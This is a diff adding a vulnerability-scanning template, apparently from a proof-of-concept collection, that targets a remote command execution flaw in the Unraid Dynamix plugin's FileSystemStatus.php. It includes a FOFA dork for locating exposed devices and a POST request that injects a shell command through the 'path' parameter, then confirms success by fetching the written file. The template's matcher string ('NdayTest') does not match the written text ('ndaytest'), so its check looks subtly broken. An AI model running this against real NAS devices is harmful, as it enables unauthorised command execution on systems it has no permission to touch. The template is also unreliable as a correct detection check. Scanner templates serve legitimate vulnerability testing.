@@ -1,0 +1,33 @@
+id: unraid-nas-dynamix-command-execution
+info:
+  name: "Unraid Dynamix插件 FileSystemStatus.php 远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "/webGui/images/banner.png"
+    日期：2024-04-29
+    该漏洞源于Unraid Dynamix插件在命令处理逻辑中未正确校验用户输入，攻击者可通过构造恶意请求在目标系统上执行任意命令。此缺陷允许远程未经验证的攻击者突破常规安全防护，实现对NAS设备的控制。
+  tags: Unraid,Dynamix
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /plugins/dynamix/include/FileSystemStatus.php HTTP/1.1
+    Host: {{Hostname}}
+
+    csrf_token=9855BE5478D13A31&cmd=scrub&path=echo ndaytest >NTest.txt
+- raw:
+  - |
+    GET /NTest.txt HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
